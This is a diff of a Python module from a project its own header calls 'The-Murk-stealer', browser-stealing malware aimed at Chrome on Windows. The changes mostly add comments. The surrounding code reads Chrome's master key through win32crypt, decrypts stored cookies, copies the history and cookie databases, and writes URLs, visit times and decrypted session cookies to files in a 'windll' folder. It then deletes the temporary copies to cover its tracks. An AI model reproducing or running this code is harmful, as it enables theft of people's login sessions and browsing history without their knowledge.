@@ -9,6 +9,11 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
+
+
+"""
+All imports
+"""
 import os
 import win32crypt
 import json,base64
@@ -20,13 +25,18 @@ import sqlite3
 
 
 
-
+"""
+get date, time
+"""
 def time(date):
     try:
         return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
     except:
         return "Can't decode"
 
+"""
+function which get chrome master kay
+"""
 def get_master_key_chrome():
     try:
         with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
@@ -44,7 +54,9 @@ def decrypt(buff, master_key):
     except:
         return "Can't decode"
 
-
+"""
+main function
+"""
 def Chrome():
     try:
         path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
@@ -54,11 +66,11 @@ def Chrome():
         data_path = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default"
         files = os.listdir(data_path)
         history_db = os.path.join(data_path, 'history')
-        shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
+        shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')# find and copy history
         c = sqlite3.connect(os.environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db')
         cursor = c.cursor()
         temp = []
-        with open(rf"{path}\windll\Browsers\Chrome\history-chrome.txt", "a", encoding="utf-8") as history:
+        with open(rf"{path}\windll\Browsers\Chrome\history-chrome.txt", "a", encoding="utf-8") as history:# open and get history
             for result in cursor.execute(HistorySQL).fetchall():
                 data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
                 result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {time(data[2])}\n\n"
@@ -68,7 +80,7 @@ def Chrome():
                 history.write(result)
             history.close()
         try:
-            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
+            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')# clear all
         except:
             pass
  
@@ -77,7 +89,7 @@ def Chrome():
         data_path = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default\Network"
         files = os.listdir(data_path)
         history_db = os.path.join(data_path, 'Cookies')
-        shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
+        shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')# find and copy cookies
         #shutil.copy2(history_db, os.environ['USERPROFILE'] + 'C:\\windll\\Browsers\\Chrome\\cookies.db')
         c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
         cursor = c.cursor()
@@ -87,6 +99,9 @@ def Chrome():
 
         result = cursor.execute(CookiesSQL).fetchall()
 
+        """
+        decode cookies
+        """
         for result in cursor.execute(CookiesSQL).fetchall():
             if result[8] == 0:
                 secure = False
@@ -109,7 +124,7 @@ def Chrome():
     },
             '''% (result[1], result[7], result[2], http, result[6], secure, decrypt(result[5], get_master_key_chrome()))
 
-        with open(rf"{path}\windll\Browsers\Chrome\Cookies-Chrome.json", "a", encoding="utf-8") as cookies:
+        with open(rf"{path}\windll\Browsers\Chrome\Cookies-Chrome.json", "a", encoding="utf-8") as cookies:# open and write cookies
             results = results.replace('True', 'true')
             results = results.replace('False', 'false')
             results += '\n]'
@@ -117,7 +132,7 @@ def Chrome():
 
         cookies.close()
         try:
-            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
+            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')# clear all
         except:
             pass
     except:
